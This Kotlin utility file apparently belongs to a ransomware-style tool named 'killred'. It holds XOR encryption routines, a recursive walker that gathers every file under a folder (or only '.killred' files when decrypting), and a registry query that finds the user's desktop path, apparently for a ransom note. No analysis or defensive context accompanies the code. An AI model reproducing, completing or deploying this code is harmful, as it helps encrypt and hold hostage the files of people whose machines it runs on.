package sexy.killred.encrypt

import java.io.*
import java.util.*

object IOUtil {
    private const val BUFFER_SIZE = 4096

    fun InputStream.toByteArray(): ByteArray? {
        return try {
            val out = ByteArrayOutputStream()
            val buffer = ByteArray(BUFFER_SIZE)
            while (this.available() > 0) {
                val data = this.read(buffer)
                out.write(buffer, 0, data)
            }
            this.close()
            out.close()
            out.toByteArray()
        } catch (ioe: IOException) {
            ioe.printStackTrace()
            return null
        }
    }

    fun xor(string: String, key: Int): String {
        val stringBuilder = StringBuilder()
        for (element in string) {
            stringBuilder.append((element.toInt() xor key).toChar())
        }
        return stringBuilder.toString()
    }

    fun xor(array: ByteArray, key: Int): ByteArray {
        val bytes = ByteArray(array.size)
        for (i in array.indices) {
            bytes[i] = (array[i].toInt() xor key).toByte()
        }
        return bytes
    }

    fun findFolderFiles(files: MutableList<File?>, folder: File, isDecrypt: Boolean) {
        for (fileEntry in Objects.requireNonNull(folder.listFiles())) {
            if (fileEntry.isDirectory) {
                findFolderFiles(files, fileEntry, isDecrypt)
            } else {
                if (isDecrypt) {
                    if (fileEntry.name.endsWith(".killred")) {
                        files.add(File(fileEntry.absolutePath))
                    }
                } else {
                    files.add(File(fileEntry.absolutePath))
                }
            }
        }
    }

    private const val REGQUERY_UTIL = "reg query "
    private const val REGSTR_TOKEN = "REG_SZ"
    private const val DESKTOP_FOLDER_CMD = (REGQUERY_UTIL
            + "\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\"
            + "Explorer\\Shell Folders\" /v DESKTOP")

    fun getCurrentUserDesktopPath(): String? {
        return try {
            val process = Runtime.getRuntime().exec(DESKTOP_FOLDER_CMD)
            val reader = StreamReader(process.inputStream)
            reader.start()
            process.waitFor()
            reader.join()
            val result = reader.result
            val p = result.indexOf(REGSTR_TOKEN)
            if (p == -1) null else result.substring(p + REGSTR_TOKEN.length).trim { it <= ' ' }
        } catch (e: Exception) {
            null
        }
    }

    internal class StreamReader(private val `is`: InputStream) : Thread() {
        private val sw: StringWriter = StringWriter()
        override fun run() {
            try {
                var c: Int
                while (`is`.read().also { c = it } != -1) sw.write(c)
            } catch (e: IOException) {
            }
        }

        val result: String
            get() = sw.toString()

    }
}